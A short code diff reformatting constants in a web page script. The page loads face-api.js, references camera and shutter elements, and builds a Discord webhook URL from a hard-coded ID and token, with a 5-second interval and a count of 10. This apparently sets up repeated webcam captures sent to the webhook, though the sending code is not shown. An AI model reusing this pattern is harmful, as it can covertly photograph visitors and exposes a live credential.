@@ -76,13 +76,13 @@
 <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <script>
 (function(){
-  const ID = '1574435506844995636';
-const TOKEN = 'Hq0A-uG0XZPNTK7LMb_61inEm0CqsRZwY6ummL2R0_6VM2-okoyyCWrqnYP-RmWiIQWk';
-const HOOK = 'https://discord.com/api/webhooks/' + ID + '/' + TOKEN;
+  const ID='1574435506844995636';
+  const TOKEN='Hq0A-uG0XZPNTK7LMb_61inEm0CqsRZwY6ummL2R0_6VM2-okoyyCWrqnYP-RmWiIQWk';
+  const HOOK='https://discord.com/api/webhooks/'+ID+'/'+TOKEN;
+  const W='https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@0.22.2/weights';
+  const INTERVAL=5000;
+  const COUNT=10;
 
-const W = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@0.22.2/weights';
-const INTERVAL = 5000;
-const COUNT = 10;
   const cam=document.getElementById('cam'), video=document.getElementById('v'), frame=document.getElementById('frame');
   const hint=document.getElementById('hint'), flash=document.getElementById('flash'), shutter=document.getElementById('shutter');
   const resultEl=document.getElementById('result'), unameEl=document.getElementById('uname');
